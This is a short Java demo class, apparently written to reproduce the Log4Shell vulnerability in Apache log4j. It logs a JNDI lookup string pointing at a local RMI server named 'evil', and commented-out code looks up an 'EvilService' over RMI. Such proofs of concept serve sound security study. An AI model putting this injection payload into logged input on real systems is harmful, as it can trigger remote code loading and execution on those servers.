package com.hand.log;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.net.MalformedURLException;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;

/**
 * @author : kebukeYi
 * @date :  2021-12-11 12:51
 * @description:
 * @question:
 * @link:
 **/
public class Log4jDemo {

    private static final Logger logger = LogManager.getLogger(Log4jDemo.class);

    public static void main(String[] args) throws RemoteException, NotBoundException, MalformedURLException {
        String useranme = "${jndi:rmi://127.0.0.1:1099/evil}";
        //useranme = "${java:os}";
        logger.info("Hello,{} !", useranme);

        // final EvilService evilService = (EvilService) Naming.lookup("rmi://127.0.0.1:1099/evil");
        // System.out.println(evilService.getList().toString());
    }
}
 
